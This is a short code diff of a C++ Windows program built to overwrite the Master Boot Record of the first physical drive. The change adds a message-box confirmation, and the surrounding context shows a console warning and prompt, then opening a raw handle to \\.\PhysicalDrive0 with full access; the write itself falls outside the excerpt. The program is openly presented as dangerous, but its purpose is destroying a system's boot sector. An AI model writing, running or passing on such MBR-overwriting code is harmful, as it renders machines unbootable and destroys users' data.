@@ -7,12 +7,19 @@
 int main() 
 {
     // Confirmation
+    
     std::string confirmation = "no";
     std::cout << "This program is dangerous! Are you sure that you want to run this?\n";
     std::cout << "Please type 'yes' or type 'no'\n>";
     std::cin >> confirmation;
     if (confirmation != "yes") { printf("Exiting program..."); return -1; }
 
+    // Show A Message Box, If User Does Not Click Yes Then Exit The Program Else Contiune Running Program
+    if (MessageBoxA(NULL, "This will overwrite your Windows MBR. It will damage your system. Are you sure?", "MBR Confirmation!", MB_YESNO) != IDYES) 
+	{ 
+		ExitProcess(1); 
+	}
+    
     // Overwrite
     HANDLE drive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
     if (drive == INVALID_HANDLE_VALUE) { printf("Error opening a handle to the drive."); return -1; }
